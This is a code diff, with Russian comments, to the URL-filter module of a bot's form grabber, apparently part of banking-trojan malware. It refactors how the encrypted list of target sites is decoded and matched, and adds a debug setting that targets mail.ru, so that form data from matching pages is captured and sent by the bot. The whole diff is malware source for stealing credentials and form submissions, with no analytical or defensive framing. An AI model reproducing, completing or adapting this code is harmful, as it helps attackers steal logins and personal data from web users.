@@ -18,7 +18,11 @@
 //  Массив URL адресов с которых бот будет отправлять
 //  данные HTML форм.
 //****************************************************
-char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
+#ifndef DEBUGCONFIG
+	char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
+#else
+	char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = "*mail.ru*\0";
+#endif
 #define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */
 
 
@@ -34,86 +38,34 @@ char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
 #define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */
 
 
-// Максимальный размер фильтра в массиве
-DWORD FGR_FILTERS_MAX_FILTER_LEN = 0;
-
-
-//---------------------------------------------------------------------
-bool FGRFiltersArrayEmpty()
-{
-	// Функция возвращает истину если массив фильтров не
-	// содержит данных
-	return CalcHash(FGR_URL_FILTERS) == FGR_URL_FILTERS_HASH;
-}
 //---------------------------------------------------------------------
 
-DWORD GetFGRFilterMaxLen()
-{
-	// Функция возвращает максимальный размер фильтра в массиве
 
-	if (FGR_FILTERS_MAX_FILTER_LEN == 0)
-	{
-		PCHAR Tmp = FGR_URL_FILTERS;
-        DWORD Max = 0;
-		// Перебираем массив
-		while (*Tmp != 0)
-		{
-			Max = StrCalcLength(Tmp);
-			if (Max > FGR_FILTERS_MAX_FILTER_LEN)
-				FGR_FILTERS_MAX_FILTER_LEN = Max;
-
-			// Переходим к следующей строке
-			Tmp = STR::End(Tmp);
-			Tmp++;
-        }
-	}
-
-	return FGR_FILTERS_MAX_FILTER_LEN;
-}
-//---------------------------------------------------------------------
-
+//-------------------------------------------------
+//  FiltrateFormGrabberURL - Функция возвращает
+//  	истину если ссылка поддерживается
+//		формграбером
+//-------------------------------------------------
 bool FiltrateFormGrabberURL(PCHAR URL)
 {
 	//  Ыункция возвращает истину если ссылка
 	//	поддерживается	формграбером
 
-	if (STR::IsEmpty(URL))
+	if (AnsiStr::IsEmpty(URL))
 		return false;
 
-	if (FGRFiltersArrayEmpty())
+	TStrEnum E(FGR_URL_FILTERS, FGRFILTER_PARAM_ENCRYPTED_URLS, FGR_URL_FILTERS_HASH);
+
+	if (E.IsEmpty())
 		return true;
 
-
-	DWORD MaskLen = GetFGRFilterMaxLen();
-
-	PCHAR Mask = STR::Alloc(MaskLen);
-	if (Mask == NULL) return true;
-
-	bool Result = false;
-
-	PCHAR Tmp = FGR_URL_FILTERS;
-
-	// Перебираем массив
-	while (*Tmp != 0)
+	while (E.Next())
 	{
-    	// декодируем текущую строку
-		m_memset(Mask, 0, MaskLen);
-		Decrypt(Tmp, Mask);
-
-		if (WildCmp(URL, Mask))
-		{
-			Result = true;
-            break;
-        }
-
-		// Переходим к следующей строке
-		Tmp = STR::End(Tmp);
-		Tmp++;
+		if (WildCmp((char*)URL, E.Line().t_str()))
+            return true;
 	}
 
-	STR::Free(Mask);
-
-    return Result;
+    return false;
 }
 //---------------------------------------------------------------------
 
